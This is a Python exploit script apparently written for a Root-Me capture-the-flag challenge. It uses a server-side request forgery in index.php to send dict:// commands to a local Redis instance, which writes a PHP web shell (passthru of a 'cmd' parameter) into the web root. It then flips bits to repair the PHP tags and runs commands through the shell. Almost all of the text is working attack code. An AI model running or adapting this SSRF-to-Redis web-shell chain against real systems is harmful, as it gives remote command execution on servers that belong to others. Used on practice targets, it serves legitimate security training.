# python3
# Adjust those variables to the server hosting the challenge and the way it answers to a request
url = 'http://ctf01.root-me.org/'
header = b'REDIS0006\xfe\x00\x00\x06'
trailer = b'\n\xff\xe7\x1fa\x10\x9bm\tB'
# Ajust this variable to the path where to dump data on you machine
path = '../'

import requests
headers = {}
php_dir = '/var/www/html'
php_file = 'rootme.php'
# Utiliser "<<" pour "<?" et ">>" pour "?>"
php_code = '<<php ' \
                   '$v = 0;' \
                   'passthru ($_GET[\'cmd\'], $v);' \
                   'echo PHP_EOL.\'RETURN CODE: \'.$v.PHP_EOL;' \
                   '>>'
redis_key = 'poison'
commands = [
        f'config set dir {php_dir}',
        f'config set dbfilename {php_file}',
        f'set {redis_key} "{php_code}"',
        f'setbit {redis_key} 14 1',
        f'setbit {redis_key} 15 1',
        f'setbit {redis_key} {(len (php_code) - 1) * 8 - 1} 1',
        'save',
        f'get {redis_key}',
        f'del {redis_key}',
        'config set dir /var/lib/redis/6379',
        'config set dbfilename dump.rdb'
]
for c in commands:
        print (f'{c}')
        response = requests.post (f'{url}index.php', headers=headers, data={'url': f'dict://localhost:6379/{c}'}).content.decode ('utf-8')
        start = response.rfind ('<br />')
        start = response.find ('\n', start) + 1
        end = response.find ('</pre>', start)
        response = response[start:end]
        print (f'{response}')
# Test the whole thing
response = requests.get (f'{url}{php_file}?cmd=ls -l')
print (response.content[len (header) + len (redis_key) + 2:-len (trailer)].decode ('utf-8'))

print("Please create ssh key before run creSSH2.py")
print("eg: ssh-keygen -t rsa -C \"root@ctf01.root-me.org\"")

quit ()